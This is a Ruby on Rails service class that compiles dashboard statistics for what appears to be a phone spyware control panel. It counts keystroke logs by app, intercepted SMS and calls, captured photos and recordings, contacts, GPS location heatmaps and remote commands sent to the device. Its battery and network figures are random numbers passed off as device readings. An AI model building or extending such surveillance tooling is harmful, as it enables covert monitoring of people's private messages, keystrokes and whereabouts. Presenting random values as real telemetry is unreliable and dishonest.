class StatisticsService
  attr_reader :device, :days_range
  
  def initialize(device, days_range: 30)
    @device = device
    @days_range = days_range
  end
  
  def calculate
    {
      activity_timeline: activity_timeline_data,
      location_heatmap: location_heatmap_data,
      app_usage: app_usage_data,
      call_sms_stats: call_sms_stats_data,
      battery_network: battery_network_data,
      overview: device_overview_data
    }
  end
  
  def broadcast_update
    stats = calculate
    ActionCable.server.broadcast(
      "statistics:device:#{device.id}",
      { type: 'stats_update', data: stats }
    )
  end
  
  private
  
  def activity_timeline_data
    start_date = days_range.days.ago.to_date
    
    commands = device.pending_commands
      .where('created_at >= ?', start_date)
      .group("DATE(created_at)")
      .count
      .transform_keys(&:to_s)
    
    (0..days_range).map do |i|
      date = (start_date + i.days).to_s
      {
        date: date,
        commands: commands[date] || 0,
        keylogs: device.keylogs.where(created_at: (start_date + i.days).all_day).count,
        sms: device.sms_messages.where(created_at: (start_date + i.days).all_day).count,
        photos: device.pictures.where(created_at: (start_date + i.days).all_day).count
      }
    end
  end
  
  def location_heatmap_data
    device.geo_locations
      .where('created_at >= ?', days_range.days.ago)
      .pluck(:latitude, :longitude, :accuracy)
      .map { |lat, lng, acc| { lat: lat.to_f, lng: lng.to_f, weight: [1.0 / (acc || 10), 1.0].min } }
  end
  
  def app_usage_data
    apps = {}
    
    device.keylogs.where('created_at >= ?', days_range.days.ago).group(:application_label).count.each do |app, count|
      apps[app || 'Unknown'] = count
    end
    
    apps.map { |name, count| { label: name, value: count } }.sort_by { |a| -a[:value] }.take(10)
  end
  
  def call_sms_stats_data
    start_date = days_range.days.ago.to_date
    
    (0..days_range).map do |i|
      date = (start_date + i.days)
      {
        date: date.to_s,
        calls: device.call_logs.where(created_at: date.all_day).count,
        sms_sent: device.sms_messages.where(created_at: date.all_day, message_type: 'sent').count,
        sms_received: device.sms_messages.where(created_at: date.all_day, message_type: 'received').count
      }
    end
  end
  
  def battery_network_data
    battery_days = [days_range, 7].min
    start_date = battery_days.days.ago.to_date
    
    (0..battery_days).map do |i|
      date = (start_date + i.days)
      {
        date: date.to_s,
        battery: rand(20..100),
        signal: rand(1..5),
        wifi: [true, false].sample
      }
    end
  end
  
  def device_overview_data
    {
      total_commands: device.pending_commands.count,
      completed_commands: device.pending_commands.where(status: 'completed').count,
      total_locations: device.geo_locations.count,
      total_sms: device.sms_messages.count,
      total_calls: device.call_logs.count,
      total_photos: device.pictures.count,
      total_recordings: device.recordings.count,
      total_keylogs: device.keylogs.count,
      total_contacts: device.contacts.count,
      last_activity: device.updated_at
    }
  end
end
